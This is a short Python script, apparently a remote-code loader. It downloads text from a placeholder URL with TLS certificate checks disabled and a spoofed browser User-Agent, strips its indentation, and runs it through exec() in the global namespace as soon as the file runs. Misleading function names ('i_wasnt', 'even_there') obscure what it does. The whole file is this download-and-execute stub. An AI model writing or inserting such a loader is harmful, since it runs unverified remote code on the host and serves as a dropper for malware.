import urllib.request
import ssl

def i_wasnt(url): 
    context = ssl._create_unverified_context()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
    request = urllib.request.Request(url, headers=headers)
    response = urllib.request.urlopen(request, context=context)
    return response.read().decode('utf-8')

def normalize_indentation(content):
    # Normalize indentation by removing leading spaces
    lines = content.splitlines()
    min_indent = min(len(line) - len(line.lstrip()) for line in lines if line.strip())
    normalized_lines = [line[min_indent:] if len(line) > min_indent else line for line in lines]
    return "\n".join(normalized_lines)

def even_there():
    url = "your url here"
    content = i_wasnt(url)
    cleaned_content = normalize_indentation(content)
    exec(cleaned_content, globals())

even_there()
